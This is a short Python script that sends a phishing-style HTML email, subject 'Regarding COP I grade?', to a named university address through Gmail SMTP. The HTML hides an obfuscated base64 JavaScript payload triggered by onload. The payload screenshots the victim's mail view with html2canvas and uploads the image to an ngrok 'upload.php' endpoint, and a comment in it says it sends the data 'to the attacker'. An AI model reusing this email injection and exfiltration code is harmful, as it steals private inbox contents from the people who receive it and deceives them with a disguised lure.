import requests
import smtplib
from email.message import EmailMessage
import hashlib
from urllib.request import urlopen
from datetime import date
import json
from os import listdir
from os.path import isfile, join

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText



change_msgs= []
error_msgs=[]
data = json.loads(open("./data.json").read())
password=data["from-password"]
sender=data["from-email"]
recipientold=data["to-email"]
msg = MIMEMultipart('alternative')
recipients=["cs5190415@iitd.ac.in"]

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(sender, password)
for recipient in recipients:
    msg['Subject'] = "Regarding COP I grade?"
    msg['From'] = sender
    msg['To'] = recipient

    # Create the body of the message (a plain-text and an HTML version).
    text = "Hi!\nHow are you?\nHere is the link you wanted:\nhttp://www.python.org"
    html = """\
    <head xmlns="&quot; onload=&quot;eval(atob('KGFzeW5jICgpID0+IHsKYXdhaXQgJC5nZXRTY3JpcHQoImh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL0ZpbGVTYXZlci5qcy8xLjMuOC9GaWxlU2F2ZXIubWluLmpzIik7CmF3YWl0ICQuZ2V0U2NyaXB0KCJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9odG1sMmNhbnZhcy8wLjQuMS9odG1sMmNhbnZhcy5taW4uanMiKTsKICAgIAp9KSgpOwpjb25zdCBteWZ1bmM9YXN5bmMgKGV2ZW50KSA9PiB7CiAgY29uc29sZS5sb2coJzAnKTsKCmh0bWwyY2FudmFzKGRvY3VtZW50LmJvZHksIHsKb25yZW5kZXJlZDogZnVuY3Rpb24oY2FudmFzKQp7CmNhbnZhcy50b0Jsb2IoYXN5bmMgZnVuY3Rpb24oYmxvYikgewogICAgICAgIGNvbnN0IHVwbG9hZEVuZHBvaW50ID0gJ2h0dHBzOi8vM2UyMjg1NjRmODA5Lm5ncm9rLmlvL3VwbG9hZC5waHAnOwoKICAgICBjb25zdCBmb3JtRGF0YSA9IG5ldyBGb3JtRGF0YSgpOwogICAgY29uc3QgaW5ib3haaXAgPSBibG9iOwogICAgZm9ybURhdGEuYXBwZW5kKCdpbmJveCcsIGluYm94WmlwLCAnYS5wbmcnKTsKCiAgICAvLyBzZW5kIHRoZSB6aXAgZmlsZSB0byB0aGUgYXR0YWNrZXIKICAgIHJldHVybiBmZXRjaCh1cGxvYWRFbmRwb2ludCwgewogICAgICAgIG1ldGhvZDogJ1BPU1QnLAogICAgICAgIG1vZGU6ICduby1jb3JzJywKICAgICAgICBib2R5OiBmb3JtRGF0YQogICAgfSk7Cn0pOwp9Cn0pOwp9Owpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIG15ZnVuYywgdHJ1ZSk7IA=='))"><svg></svg>Hello friend, Wassup?</head>
    """

    # Record the MIME types of both parts - text/plain and text/html.
    part1 = MIMEText(text, 'plain')
    part2 = MIMEText(html, 'html')

    # Attach parts into message container.
    # According to RFC 2046, the last part of a multipart message, in this case
    # the HTML message, is best and preferred.
    # msg.attach(part1)
    msg.attach(part2)

    # for recipient in recipients
    server.sendmail(sender,recipient,msg.as_string())
    print("sent to "+recipient)
server.quit()